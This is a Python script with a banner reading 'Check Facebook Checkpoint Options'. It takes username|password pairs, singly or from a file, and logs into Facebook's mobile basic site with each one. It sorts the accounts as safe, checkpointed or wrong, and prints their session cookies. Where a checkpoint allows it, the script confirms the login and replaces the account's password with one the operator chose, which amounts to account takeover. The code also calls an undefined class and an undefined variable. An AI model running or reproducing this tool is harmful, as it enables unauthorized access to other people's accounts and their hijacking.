import requests as req,re
from bs4 import BeautifulSoup as par

#data - data
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]

class Main(object):
	
	def __init__(self,url,user,pw):
		self.url = url
		self.user = user
		self.pw = pw
	def banner(self):
		logo="""
	
   ______     __      ____             _ 
  / ____/__  / /__   / __ \____  _____(_)
 / /   / _ \/ //_/  / / / / __ \/ ___/ / Coded By: Hasan Mahmud
/ /___/  __/ ,<    / /_/ / /_/ (__  ) / https://www.facebook.com/sheaik00
\____/\___/_/|_|   \____/ .___/____/_/   
                       /_/               
	Check Facebook Checkpoint Options
	"""
		return logo
		

class Eksekusi(Main):
	
	def cek_opsi(self):
		global aman,cp,salah
		session=req.Session()
		session.headers.update({
			"Host":"mbasic.facebook.com",
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-encoding":"gzip, deflate",
			"accept-language":"id-ID,id;q=0.9",
			"referer":"https://mbasic.facebook.com/",
			"user-agent":"Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		})
		soup=par(session.get(self.url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
		link=soup.find("form",{"method":"post"})
		for x in soup("input"):
			data.update({x.get("name"):x.get("value")})
		data.update({"email":self.user,"pass":self.pw})
		urlPost=session.post(self.url+link.get("action"),data=data)
		response=par(urlPost.text, "html.parser")
		if "c_user" in session.cookies.get_dict():
			if "Your Account is Locked" in urlPost.text:
				print(f"\r[×] new session account\n[=] {self.user} | {self.pw}					\n\n",end="")
			else:
				aman+=1
				print(f"\r[=] {self.user} | {self.pw}\n[√] Safe Account\n[=] Cookie: {''.join(session.cookies.get_dict())}				\n\n",end="")
		elif "checkpoint" in session.cookies.get_dict():
			cp+=1
			title=re.findall("\<title>(.*?)<\/title>",str(response))
			link2=response.find("form",{"method":"post"})
			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
			for x in response("input"):
				if x.get("name") in listInput:
					data2.update({x.get("name"):x.get("value")})
			an=session.post(self.url+link2.get("action"),data=data2)
			response2=par(an.text,"html.parser")
			number=0
			print(f"[=] {self.user} | {self.pw}			\n",end="")
			cek=[cek for cek in response2.find_all("option")]
			print(f"\r[!] There is {len(cek)} opsi:\n",end="")
			if(len(cek)==0):
				if "View the login details displayed. This you?" in title:
					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
					if "y" in ubahP:
						self.ubah_pw(session,response,link2)
					else:
						print(f"\r[√] Account tap yes\n[=] Cookie: {coki}									\n")
				elif "Enter Login Code to Continue" in re.findall("\<title>(.*?)<\/title>",str(response)):
					print("\r[×] Akun a2f on							\n")
				else:
					print("Error!")
			elif(len(cek)<=1):
				for x in range(len(cek)):
					number+=1
					opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
					print(f"\r[{number}]. {''.join(opsi)}							\n\n",end="")
			elif(len(cek)>=2):
				for x in range(len(cek)):
					number+=1
					opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
					print(f"\r[{number}]. {''.join(opsi)}							\n",end="")
				print("")
			else:
				if "c_user" in session.cookies.get_dict():
					cp-=1
					aman+=1
					print(f"\r[=] {self.user} | {self.pw}\n[√] Safe Account\n[=] Cookie: {''.join(session.cookies.get_dict())}				\n",end="")
					
		else:
			salah+=1
			print(f"\r[=] {self.user} | {self.pw}			\n",end="")
			print("\r[!] Password is wrong or has been changed				\n")
	def ubah_pw(self,session,response,link2):
		dat,dat2={},{}
		but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
		for x in response("input"):
			if x.get("name") in but:
				dat.update({x.get("name"):x.get("value")})
		ubahPw=session.post(self.url+link2.get("action"),data=dat).text
		resUbah=par(ubahPw,"html.parser")
		link3=resUbah.find("form",{"method":"post"})
		but2=["submit[Next]","nh","fb_dtsg","jazoest"]
		if "Create New Password" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
			for b in resUbah("input"):
				if b.get("name") in but2:
					dat2.update({b.get("name"):b.get("value")})
			dat2.update({"password_new":"".join(pwBaru)})
			an=session.post(self.url+link3.get("action"),data=dat2)
			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
			print(f"\r[√] Account tap yes\n[=] Password changed!\n[=] {self.user} | {''.join(pwBaru)}\n[=] Cookie: {coki}							\n",end="")
			print("")

def menu():
	print("[1]. Check the options one by one\n[2]. Check options via file\n[!]. Note: in the middle of the username and password\n     there must be a sign '|' Or '•'\n")
	_pilih=input("[+] Chosee: ")
	while _pilih not in ("01","1","02","2"):
		print("\n[!] No choice")
		_pilih=input("[+] Chosee: ")
	if(_pilih in ("01","1")):
		ww=input("\n[?] Ubah pw when tap yes [y/t]: ")
		if ww in ("y","ya"):
			ubahP.append("y")
			pwBar=input("[+] Enter new pw: ")
			if len(pwBar) <= 5:
				exit("Password must be more than 6 characters!")
			else:
				pwBaru.append(pwBar)
		else:
			print("> Skipped")
		print("\n[!] Input username|password\n    example: latip|176")
		__data=input("[+] Input username|password: ")
		if "•" in __data:
			user,pw=__data.split("•")
		elif "|" in __data:
			user,pw=__data.split("|")
		else:
			exit("\n[!] Include sign | or • in the middle of the username and password\n")
		print(f"{'='*45}\n")
		Main = Execution("https://mbasic.facebook.com",user,pw)
		Main.cek_opsi()
	elif(_pilih in ("02","2")):
		ww=input("\n[?] Change pw when tap yes [y/t]: ")
		if ww in ("y","ya"):
			ubahP.append("y")
			pwBar=input("[+] Enter new pw: ")
			if len(pwBar) <= 5:
				exit("Password must be more than 6 characters!")
			else:
				pwBaru.append(pwBar)
		else:
			print("> Skipped")
		print("\n[!]. Enter the file name and read\n first the note above")
		__data=input("[+] Enter filename: ")
		try:
			_file=open(__data,"r").readlines()
		except FileNotFoundError:
			exit("[!] File not found")
		print("[✓] Number of accounts:",len(_file),f"\n{'='*45}\n")
		for x in _file:
			if "•" in x:
				user,pw=x.split("•")
			elif "|" in x:
				user,pw=x.split("|")
			else:
				exit("\n[!] No sign available | •\n")
			Eksekusi("https://mbasic.facebook.com",user.replace("\n",""),pw.replace("\n","")).cek_opsi()
		exit(f" *** Check the account finished results: \n [+] OK/CP/WRONG: {str(aman)}/{str(cp)}/{str(wrong)}\n")
	
if __name__=="__main__":
	print(Eksekusi("","","").banner())
	menu()
						
		
